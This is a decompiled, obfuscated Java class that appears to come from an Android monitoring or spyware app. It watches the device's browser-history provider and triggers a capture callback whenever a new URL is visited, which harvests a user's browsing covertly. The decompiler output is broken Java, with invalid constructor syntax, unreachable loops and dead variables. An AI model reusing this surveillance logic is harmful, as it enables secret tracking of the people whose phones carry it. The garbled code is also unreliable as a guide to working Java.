package com.vvt.capture.browserurl.b;

import android.content.ContentResolver;
import android.net.Uri;
import com.vvt.base.capture.i;
import com.vvt.d.d;

public class a
  implements com.vvt.base.capture.e
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private i c;
  private com.vvt.d.a d;
  private com.vvt.d.b e;
  private ContentResolver f;
  private com.vvt.d.e g;
  
  public a(ContentResolver paramContentResolver)
  {
    this.f = paramContentResolver;
  }
  
  private com.vvt.d.b c()
  {
    b localb = new com/vvt/capture/browserurl/b/b;
    localb.<init>(this);
    return localb;
  }
  
  private void d()
  {
    boolean bool1 = true;
    float f1 = Float.MIN_VALUE;
    boolean bool2 = false;
    float f2 = 0.0F;
    boolean bool3 = a;
    if (bool3) {}
    Object localObject1 = d.a(this.f, 0);
    Object localObject2 = this.f;
    localObject2 = d.a((Uri)localObject1, (ContentResolver)localObject2);
    if (localObject2 != null)
    {
      localObject1 = ((com.vvt.d.e)localObject2).e();
      if (localObject1 != null) {}
    }
    else
    {
      return;
    }
    if (localObject2 != null)
    {
      localObject1 = this.g;
      if (localObject1 == null) {
        this.g = ((com.vvt.d.e)localObject2);
      }
    }
    for (;;)
    {
      if (bool1)
      {
        bool3 = b;
        if (bool3) {}
        localObject1 = this.c;
        ((i)localObject1).a();
      }
      bool3 = a;
      if (!bool3) {
        break;
      }
      break;
      long l1 = ((com.vvt.d.e)localObject2).a();
      localObject1 = this.g;
      long l2 = ((com.vvt.d.e)localObject1).a();
      bool3 = l1 < l2;
      if (!bool3) {
        bool3 = bool1;
      }
      for (;;)
      {
        l1 = ((com.vvt.d.e)localObject2).b();
        com.vvt.d.e locale = this.g;
        l2 = locale.b();
        l1 -= l2;
        boolean bool4 = a;
        if (bool4) {}
        bool4 = a;
        if ((!bool4) || (bool3))
        {
          l2 = 30000L;
          bool3 = l1 < l2;
          if (!bool3) {}
        }
        else
        {
          bool2 = bool1;
          f2 = f1;
        }
        bool1 = bool2;
        f1 = f2;
        break;
        bool3 = false;
        localObject1 = null;
      }
      bool1 = false;
      f1 = 0.0F;
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.d;
    if (localObject == null)
    {
      this.c = parami;
      localObject = new com/vvt/d/a;
      ((com.vvt.d.a)localObject).<init>();
      this.d = ((com.vvt.d.a)localObject);
      localObject = c();
      this.e = ((com.vvt.d.b)localObject);
      localObject = this.d;
      com.vvt.d.b localb = this.e;
      ContentResolver localContentResolver = this.f;
      ((com.vvt.d.a)localObject).a(localb, localContentResolver);
      bool = b;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    com.vvt.d.a locala = this.d;
    if (locala != null)
    {
      locala = this.d;
      com.vvt.d.b localb = this.e;
      locala.a(localb);
    }
    this.e = null;
    this.d = null;
    this.g = null;
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/browserurl/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */